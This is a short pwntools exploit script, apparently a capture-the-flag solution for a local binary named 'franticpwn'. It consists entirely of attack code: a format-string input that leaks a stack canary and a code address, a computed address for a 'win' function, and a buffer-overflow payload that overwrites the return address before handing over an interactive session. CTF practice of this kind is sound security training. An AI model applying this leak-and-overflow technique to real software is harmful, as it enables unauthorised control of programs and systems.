## setup
from pwn import *
context.arch='amd64'
import os
#r=remote('',)
r=process('./franticpwn')

## datas
main=0x0000119f
win=0x00001189

## exploit
s=r.recv()
print(s)
r.sendline(b'%13$p,%17$p')
s=r.recvline()[:-1].decode().split(',')
print(s)
randomvalue=int(s[0], 16)
main_addr=int(s[1], 16)
print(randomvalue, main_addr)
win_addr=main_addr-(main-win)
s=r.recv()
print(s)
payload1=b'a'*24+p64(randomvalue)+b'b'*8+p64(win_addr)
print(payload1, len(payload1))
r.sendline(payload1)
r.interactive()
